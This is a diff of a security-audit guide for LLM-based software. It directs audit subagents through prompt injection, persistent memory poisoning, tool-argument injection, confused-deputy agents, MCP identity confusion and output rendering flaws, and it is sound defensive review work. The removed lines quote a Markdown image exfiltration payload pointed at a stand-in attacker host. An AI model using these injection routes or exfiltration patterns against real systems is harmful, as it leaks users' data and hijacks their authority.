@@ -2,66 +2,82 @@
 
 #### When to use this file
 
-Reach for this file when the target embeds a language model in a trust-sensitive path: chatbots and assistants, RAG pipelines, agent/tool-calling loops, MCP servers and clients, code that builds prompts from untrusted input, or code that consumes model output and acts on it. These targets fail differently from ordinary web apps — the dangerous data flow is *untrusted text → model → capability or sink*, and the model is a confused deputy that will faithfully carry attacker instructions across a trust boundary the developer assumed the model would respect. It won't.
+Reach for this file when a language model participates in a trust-sensitive decision: chatbots and assistants, RAG pipelines, persistent agent memory, agent/tool-calling loops, MCP servers and clients, code that builds prompts from untrusted input, or code that consumes model output and acts on it. The important data flow is *untrusted content → model or memory → capability, authority, or sink*.
 
-Use this alongside `ATTACK-CLASSES.md`, not instead of it: the transport is still HTTP, the tools still hit SQL/shell/filesystem sinks, and access control still applies. This file covers the model-specific layer on top.
-
-Pick the relevant classes based on Phase 1. Split per subsystem (retrieval, tool dispatch, output rendering) for large targets.
+Use this alongside `ATTACK-CLASSES.md`, not instead of it. Transport, access control, query construction, filesystem use, and output rendering remain ordinary trust boundaries. This file covers the model-specific delegation layer. Split large targets by retrieval, memory, tool dispatch, MCP, and output handling.
 
 ## Core discipline (include in every agent prompt for this domain)
 
 ```
-- "The model can be prompt-injected" is NOT a finding on its own. Prompt injection that only affects the attacker's own session and their own output is a party trick. A finding requires the injection to CROSS A BOUNDARY: reach a victim's context, invoke a capability the requester lacks, exfiltrate data the requester can't see, or drive a downstream sink the attacker couldn't otherwise reach (server-side SQL/shell/SSRF beyond their own session). Name the boundary crossed.
-- The bug is in the CODE, not the model. The finding is the missing code-level gate between attacker-influenceable input and a dangerous capability or sink — point at the line that grants the capability, trusts the output, or feeds the context, not the model's mood. Non-determinism is not a defense: the model's probability of complying is an exploitability detail, never a reporting blocker. If the code makes the output harmless (output that never reaches a sink), there is no finding regardless of what the model can be talked into saying.
-- Model output is untrusted input. Trace it to its sink with the same rigor as any user input. "It came from our model" is the exact assumption being attacked.
-- A guardrail prompt ("never reveal the system prompt", "refuse harmful requests") is not a security control. Do not credit it as a mitigation. If the only thing standing between the attacker and impact is instructions in the prompt, the boundary is undefended.
+- Prompt injection alone is not a finding. Require a code-level boundary failure: content reaches another principal's context, invokes authority the requester lacks, discloses data they cannot read, or drives a sink they cannot reach directly.
+- Model output, memory, tool descriptions, and MCP responses are untrusted inputs. Point to the code that grants authority, trusts output, writes durable state, or feeds a sink.
+- A guardrail prompt is not a security boundary. Count only deterministic checks, resource-scoped authorization, isolation, binding, and constrained credentials.
+- State the attacker, affected principal, effective execution identity, resource, exact action, authority used, and observable impact. An intentional direct request to use the requester's existing authority is not a delegation defect merely because a model executes it.
+- Authorization and action binding are separate controls. Attacker-controlled content that causes an action under an affected principal's valid authority is an action-binding failure when that principal did not intentionally request or approve the exact action.
+- Classify every candidate as `confirmed` only after source evidence and bounded local validation establish the boundary and result. Use `needs_validation` when a required provider, deployment, model, renderer, or identity behavior is not observable locally.
 ```
 
-## Prompt-injection attack classes (subagent_type: `general`)
+## Context, retrieval, and memory attack classes (subagent_type: `general`)
 
-**Indirect injection via retrieved / ingested content**
-The high-value class. Attacker plants instructions in data the model later ingests in *someone else's* session: a RAG document, an indexed web page, a file upload, an email, an issue/PR body, a tool's response, a filename. Trace every source that reaches the prompt context and ask "who can write this, and whose session does it fire in?" Find the ingestion path; confirm the content reaches the context window unfiltered; confirm that context has a capability worth hijacking.
+**Indirect injection through retrieved or ingested content**
+An attacker can write a RAG document, indexed page, file, email, issue body, tool response, or metadata that enters a different principal's model context. Trace who can write each source, how retrieval scopes it, whose session consumes it, and what capability is enabled there. Check isolation, resource authorization, and binding to the consuming principal's intent separately. The defect is a missing deterministic control, not persuasive text by itself.
 
-**Tool-argument injection (model output → sink)**
-The model emits a tool call and the code executes it with model-generated arguments. Those arguments hit a real sink — SQL (`query(args.filter)`), shell (`exec(args.cmd)`), file path (`readFile(args.path)`), HTTP (`fetch(args.url)` → SSRF), or another API. The code trusts the arguments because "the model produced structured output." Trace each tool handler's parameters to their sink and validate them at the handler like any request body.
+**Cross-session or cross-tenant context bleed**
+Conversation history, embeddings, retrieval results, or prompt caches are keyed too broadly. Verify tenant and ACL filters in the query itself and every cache key. A tenant field stored on an object is not enforcement if an alternate query, shared cache, or batch path omits it.
 
-**Direct injection into a privileged capability**
-Direct (same-session) injection only matters when the model can do something the *user* is not authorized to do directly. If the assistant runs tools under a service identity, or has a system prompt containing secrets, or can reach internal endpoints, then a user talking the model into using those crosses a privilege boundary even in their own session. If the model can only do what the user could already do via the UI, direct injection is not a finding. Hunt step: enumerate every capability the assistant holds that its users don't, then check whether same-session user text can steer the model into each.
+**Persistent memory poisoning**
+Attacker-controlled content or model summaries are written into memory that later shapes another task, user, or privileged session. Review who may create, update, merge, and delete memory; its provenance and tenant scope; whether low-trust observations become durable instructions or facts; and whether retrieval distinguishes user preferences from tool policy. Memory intentionally saved by a user and used only for that user's intentional, allowed requests is not a cross-boundary finding.
 
-**Prompt-template / delimiter injection**
-Untrusted input concatenated into the prompt without fencing or role separation, so the attacker forges structure the orchestrator trusts: a fake system turn, a fabricated prior conversation turn, or a counterfeit tool result. The finding is the assembly code — the concatenation that lets user bytes impersonate a trusted role — not the model obeying them. Find where the prompt is built and whether untrusted spans are delimited or escaped from control text.
+**Prompt role and provenance confusion**
+Prompt assembly lets untrusted text impersonate a system message, prior turn, tool result, policy, or memory record. Look for string concatenation, untyped history, caller-controlled role fields, and serialization round trips that lose source labels. Confirm that the forged provenance changes a deterministic trust decision or reaches a meaningful capability.
 
-## Agent and tool-calling attack classes (subagent_type: `general`)
+## Tool and action attack classes (subagent_type: `general`)
 
-**Excessive agency / confused-deputy authority**
-The agent executes tools under *its own* identity (service account, broad API key, DB superuser) rather than the requesting user's. Every tool call is then a privilege-escalation vector: the user asks, the agent acts with more authority than the user has. Check whether tool execution re-checks the *user's* permission on the *specific resource*, or just that "the agent is allowed to call this tool." The same gap at the parameter level is IDOR through tools: `get_document(id)` / `read_file(path)` with the ID filled from user text and no check that *this* user may reach *that* resource — endpoint IDOR reached by asking. Common false positive: a shared service credential that runs every query *scoped to the authenticated user's ID* is normal, safe architecture — not a confused deputy.
+**Tool-argument injection into a downstream sink**
+Model-produced arguments reach SQL, shell, file, URL-fetch, or privileged APIs without handler-side validation. Treat the tool schema as input parsing, then follow each field from decoded call to sink. Structured output narrows shape; it does not establish authorization, safe paths, safe URLs, or query semantics.
 
-**Unbounded action loops / cost and side-effect abuse**
-Agent loops that call tools until a goal is met: can an attacker drive an expensive or irreversible loop (spend, send, delete, external API calls) through a single crafted request? Look for tool calls with side effects inside a model-controlled iteration with no per-action authorization or budget. The impact that makes this a finding crosses out of the attacker's own session — it hits the operator's bill, a shared rate/quota limit, or other tenants' availability (denial-of-wallet), so it survives the "capability they already have" test even when the attacker only touches their own request.
+**Excessive agency and confused-deputy authority**
+The agent uses a service identity or broad credential, while the tool handler does not re-check the requesting principal's permission on the named resource. Verify both the effective identity and whether the caller could perform that exact operation through the normal product interface. A shared credential with enforced per-user query scope is not a defect.
 
-**Sub-agent / MCP trust inheritance**
-When an agent spawns sub-agents or connects to MCP servers, what identity and context do they inherit? A sub-agent or tool server that receives the full session, credentials, or a broader capability set than the task needs is a lateral-movement primitive. A malicious or compromised MCP server is an attacker that speaks directly into the model's context — treat its responses as indirect injection.
+**Action-confirmation and approval binding**
+A user approves one described action but execution can use changed arguments, a different resource, a different principal, or a later model turn. An action-binding defect also exists when attacker-controlled content causes a side effect under a victim's valid authority without the victim's intentional request or approval, even if generic authorization permits the victim to perform it. Review whether intent or confirmation binds the normalized tool name, complete argument object, requester, target, amount, expiry, and batch membership. Check retries and resumed sessions: an approval must not authorize a mutated or duplicate side effect.
 
-## Output-handling and disclosure attack classes (subagent_type: `general`)
+**Tool-schema and dispatcher disagreement**
+The schema accepts aliases, extra fields, duplicate keys, coercions, nested free-form objects, or out-of-range values that the dispatcher or handler interprets differently. Compare schema validation, canonicalization, generated bindings, and handler defaults. Validate again where values become resource selectors or security-relevant options.
 
-**Insecure output rendering (XSS / injection via model output)**
-Model output rendered as HTML/Markdown without sanitization → stored/reflected XSS. Markdown image/link rendering is the classic exfiltration channel: the model emits `![x](https://attacker/?d=<secret from context>)` and the client fetches it, leaking context to the attacker's server. Check where model output is displayed and whether it's treated as trusted HTML. The image-exfil channel only fires if the render surface auto-loads remote resources and no CSP `img-src` restricts the destination — if the rendering client is out of scope or unknown (native app, terminal, CSP-locked web UI), the sink is unconfirmed: treat it as unverifiable, not a finding.
+**Unbounded delegated action loops**
+A bounded request can enqueue repeated spend, send, mutation, or external API work without a per-request budget, per-action authorization, cancellation, or idempotency control. Confirm impact on shared cost, quotas, other users, or durable state. Do not test by exhausting a service; use code-level accounting and a locally bounded loop.
 
-**System-prompt / context extraction to a real secret**
-Extraction is only a finding if the context actually contains something sensitive — API keys, other users' data, internal URLs, hidden business rules that gate access. Confirm the secret is really in the context (read the prompt-assembly code) before reporting. A leaked generic "you are a helpful assistant" prompt is not a finding.
+## MCP and sub-agent trust classes (subagent_type: `general`)
 
-**Cross-session / multi-tenant context bleed**
-Conversation history, embeddings, or the KV/prompt cache keyed too broadly, so one user's context appears in another's session. Trace the cache/session key: is it scoped per user, or is there a path where a shared key mixes tenants? Related: retrieval (vector or keyword search) that lacks a per-tenant metadata/ACL filter at query time pulls another tenant's chunks into context — IDOR at the retrieval layer; confirm the query itself applies the tenant filter, not just that documents carry a tenant field. These are code bugs (bad cache key, shared buffer, unfiltered query), not model behavior — verify them in the storage/retrieval layer.
+**Sub-agent and MCP trust inheritance**
+A delegated task receives the full session, credentials, memory, or capabilities rather than the least authority required. Check the principal and tenant carried into each call, capability narrowing, credential audience, and whether delegated results are treated as untrusted on return.
+
+**MCP server and tool identity confusion**
+Calls or results are routed by attacker-influenceable server names, tool names, request IDs, resource URIs, or model-selected aliases rather than the authenticated connection and outstanding request. Check whether two servers can claim the same tool or resource identity, whether reconnect changes the binding, and whether a response from one server can satisfy another server's pending call.
+
+**MCP metadata and schema as policy**
+Tool descriptions, resource metadata, prompts, completion hints, or schemas supplied by an MCP peer are trusted as policy or authorization. These fields can guide the model but cannot grant capability. Find the deterministic allowlist, server identity check, and handler authorization that remain authoritative when metadata conflicts.
+
+## Output and disclosure attack classes (subagent_type: `general`)
+
+**Insecure output rendering**
+Model output reaches an executing HTML, Markdown, template, URL, or command sink without the sink's required encoding and policy. For browser rendering, verify auto-loaded resources and CSP or sanitization in `CLIENT-SIDE.md`; renderer behavior outside the repository makes the candidate `needs_validation`.
+
+**Sensitive context extraction**
+The assembled context contains credentials, another user's data, private source, or policy values that themselves grant access, and user-influenced output exposes them. Read prompt assembly and data-fetch code. Disclosure of generic instructions or behavior that does not cross a data boundary is not a finding.
 
 ## Universal moves (apply across the above)
 
-- **Draw the boundary before hunting.** Enumerate: what identity do tools run as, what's in the context window, who can write to each context source, where does output go. Most AI findings fall out of a correct map of these four; most AI false positives come from not drawing it.
-- **Find the capability, then find who can reach it.** Start from the most dangerous tool (delete, spend, exec, fetch-internal) and work backwards to whether untrusted text can reach its arguments. Power × reachability, same as any privileged interface.
+- Draw four maps first: each execution identity, each capability, every writable context or memory source, and each output destination. Then connect the principal at the start to the authority at the end.
+- Start at side-effecting tools and work backward through dispatcher, schema, confirmation, model context, retrieval, and ingestion. Start at durable memory reads and trace every writer.
+- Compare direct, queued, retry, resume, batch, and delegated paths for the same action. The strongest gate must apply after arguments are final and before every side effect.
 
 ## Validation rules (apply before reporting ANY finding here)
 
-1. **Name the boundary crossed.** State exactly who the attacker is, whose session/identity the payload executes in, and what they get that they couldn't get directly. If attacker and victim are the same principal and the capability is one they already have, it is not a finding.
-2. **For confused-deputy / excessive-agency claims, prove both halves.** Show (a) the tool performs no per-resource check scoped to the requesting user, AND (b) the action is one the user could not perform through a normal authenticated request. A shared service credential with per-user query scoping fails both tests and is not a finding.
-3. **Cite the trusting line and prove the taint reaches it.** For tool-argument and output findings, show the concrete sink (the `exec`/`query`/`fetch`/`innerHTML`) with model-influenced data reaching it unvalidated; for extraction/disclosure findings, cite the prompt-assembly code and confirm the secret or cross-tenant data is really in the context. If you can't cite the code, you have a black-box observation, not a finding.
-4. **Don't assert capabilities you can't see in source.** Claims that depend on deployment facts not in the repo — whether an "internal-only" endpoint is actually unreachable by the user, what a tool's target really exposes, which client renders the output — are unverifiable from source. If the user could reach the same thing directly (flat network, same origin), it is not a privilege crossing. Confirm the capability and the boundary in code, or mark it unverifiable rather than reporting it.
-5. **Return ONLY confirmed findings** with the boundary crossed, the trusting code path, and the observable result — or "No exploitable AI/LLM issues found" if that's honest.
+1. Name the crossed boundary and observable result: attacker, affected principal or shared resource, execution identity, target, and unauthorized or unrequested action or disclosure.
+2. For confused-deputy authority claims, prove the tool lacks requester-and-resource authorization and that the attacker cannot perform the same action normally. For action-binding claims, instead prove attacker-controlled content caused an action under the affected principal's authority that the principal did not intentionally request or approve. Valid generic authorization does not establish that intent.
+3. For memory or retrieval claims, cite both the attacker-controlled write and the later cross-principal read or privileged decision. A shared record without a reachable consumer is not enough.
+4. For action binding, establish the intentional request or normalized approved object, if any, and compare it with the object the handler uses. Confirm a locally observable unrequested action, mutation, duplicate, or authority change without extending the test into harmful execution. For schema disagreement, compare the normalized validated object with the handler's object.
+5. For MCP identity claims, verify the authenticated connection, request correlation, tool namespace, and effective credential. Mark `needs_validation` if external server identity or deployment routing is required.
+6. Return `confirmed` findings only with a complete source trace and meaningful result. Return `needs_validation` for a specific unresolved boundary fact and state the bounded local or owner-observed check needed to resolve it.
